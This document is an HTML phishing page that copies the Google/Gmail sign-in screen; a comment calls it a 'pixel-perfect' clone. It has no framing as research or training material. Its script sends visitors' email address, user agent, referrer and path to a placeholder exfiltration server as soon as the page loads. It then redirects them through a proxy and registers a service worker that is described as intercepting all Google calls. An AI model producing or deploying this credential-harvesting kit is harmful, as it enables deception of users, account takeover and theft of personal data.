<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://mail.google.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', sans-serif; background: #fff; }
        .container { max-width: 480px; margin: 0 auto; padding: 40px 40px 0; }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo img { height: 24px; }
        .form { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 40px; }
        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 32px; }
        input { width: 100%; height: 44px; border: 1px solid #dadce0; border-radius: 4px; padding: 13px 16px; font-size: 16px; margin-bottom: 8px; }
        input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 1px 0 rgba(0,0,0,.1), 0 1px 10px rgba(0,0,0,.1); }
        .btn { width: 100%; height: 50px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 8px; }
        .btn:hover { background: #1557b0; }
        .forgot { text-align: center; margin-top: 24px; }
        .forgot a { color: #1a73e8; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <!-- PIXEL-PERFECT GMAIL LOGIN CLONE -->
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <div class="form">
            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>
            
            <!-- EMAIL INPUT (Capture + Redirect) -->
            <input type="email" id="email" placeholder="Email or phone" autocomplete="email">
            <button class="btn" onclick="proxyRedirect()">Next</button>
            
            <div class="forgot">
                <a href="#" onclick="proxyRedirect()">Forgot email?</a>
            </div>
        </div>
    </div>

    <script>
        // CAPTURE VISITOR DATA IMMEDIATELY
        fetch('https://YOUR-EXFIL-SERVER.com/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                email: document.getElementById('email').value || 'unknown',
                ua: navigator.userAgent,
                ip: '', // Filled by server
                timestamp: Date.now(),
                referrer: document.referrer,
                path: window.location.pathname
            })
        }).catch(() => {});

        // PROXY REDIRECT TO GMAIL (THROUGH YOUR WORKER)
        function proxyRedirect() {
            const email = document.getElementById('email').value;
            
            // AUTO-REDIRECT TO YOUR WORKER PROXY
            window.location.href = `./mail/u/0/#inbox?email=${encodeURIComponent(email || '')}`;
            
            // Or direct to inbox proxy:
            // window.location.href = `./mail/u/0/#inbox`;
        }

        // ENTER → NEXT
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') proxyRedirect();
        });

        // LOAD → SERVICE WORKER (INTERCEPTS ALL GOOGLE CALLS)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('./sw.js');
        }
    </script>
</body>
</html>
